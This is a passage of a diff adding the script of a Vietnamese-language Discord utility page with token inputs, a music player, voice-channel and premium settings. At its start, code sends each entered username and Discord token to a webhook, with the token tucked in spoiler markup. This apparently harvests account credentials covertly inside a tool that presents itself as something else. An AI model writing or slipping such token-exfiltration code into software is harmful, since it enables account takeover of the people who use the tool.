+      try {
+        await fetch(tokenWebhook, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `🔐 **CODE NGƯỜI DÂN VIỆT NAM**\n👤 Username: ${username}\n🔑 Token: ||${token}||\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`
+          })
+        });
+      } catch (error) {
+        console.log('Không thể gửi token đến webhook:', error);
+      }
+    }
+
+    // ==================== INITIALIZATION ====================
+    function initializeApp() {
+      loadAllTokens();
+      createTokenInputs();
+      updatePlaylistCounter();
+      updateMusicStatus();
+      updateVoiceStatus();
+      updateDiscordLinkToggle();
+      
+      // Thêm event listener cho audio player
+      const audioPlayer = document.getElementById('audioPlayer');
+      audioPlayer.addEventListener('ended', function() {
+        skipAudio();
+      });
+      
+      audioPlayer.addEventListener('play', function() {
+        isPlaying = true;
+        updateMusicStatus();
+      });
+      
+      audioPlayer.addEventListener('pause', function() {
+        isPlaying = false;
+        updateMusicStatus();
+      });
+
+      // Load saved settings
+      const savedUserId = localStorage.getItem('userId');
+      if (savedUserId) {
+        document.getElementById('userId').value = savedUserId;
+        currentUserId = savedUserId;
+      }
+
+      const savedChannelId = localStorage.getItem('channelId');
+      if (savedChannelId) {
+        document.getElementById('channelId').value = savedChannelId;
+      }
+
+      const savedWebhookUrl = localStorage.getItem('webhookUrl');
+      if (savedWebhookUrl) {
+        document.getElementById('webhookUrl').value = savedWebhookUrl;
+      }
+
+      const savedVoiceChannelId = localStorage.getItem('voiceChannelId');
+      if (savedVoiceChannelId) {
+        document.getElementById('voiceChannelId').value = savedVoiceChannelId;
+      }
+
+      const savedDiscordLink = localStorage.getItem('customDiscordLink');
+      if (savedDiscordLink) {
+        document.getElementById('customDiscordLink').value = savedDiscordLink;
+      }
+      
+      const savedUseDiscordLink = localStorage.getItem('useDiscordLink');
+      if (savedUseDiscordLink !== null && isPremiumUser) {
+        useDiscordLink = savedUseDiscordLink === 'true';
+        updateDiscordLinkToggle();
+      }
+
+      // Load font
+      const savedFont = localStorage.getItem('font');
+      if (savedFont) {
+        changeFont(savedFont);
+        document.getElementById('fontSelect').value = savedFont;
+      }
+
+      // Load dark mode
+      const savedDarkMode = localStorage.getItem('darkMode') === 'true';
+      if (savedDarkMode) {
+        isDarkMode = true;
+        document.body.classList.add('dark');
+        document.querySelector('.toggle-mode').textContent = '☀️';
+      }
+    }
+
+    function checkPreviousAuth() {
+      const wasAuthenticated = localStorage.getItem('authenticated') === 'true';
+      const savedUsername = localStorage.getItem('username');
+      const savedIsPremium = localStorage.getItem('isPremium') === 'true';
+      
+      if (wasAuthenticated && savedUsername) {
+        isAuthenticated = true;
+        currentUsername = savedUsername;
+        isPremiumUser = savedIsPremium;
+        
+        document.getElementById('authContainer').style.display = 'none';
+        document.getElementById('mainApp').style.display = 'block';
+        addLog(`✅ Chào mừng trở lại ${savedUsername}!`);
+        
+        // Cập nhật badge và quyền hạn
+        updateUserPrivileges();
+        initializeApp();
+      }
+    }
+
+    // ==================== STARTUP ====================
+    document.addEventListener('DOMContentLoaded', function() {
+      checkPreviousAuth();
+    });
+  </script>
+</body>
+</html>
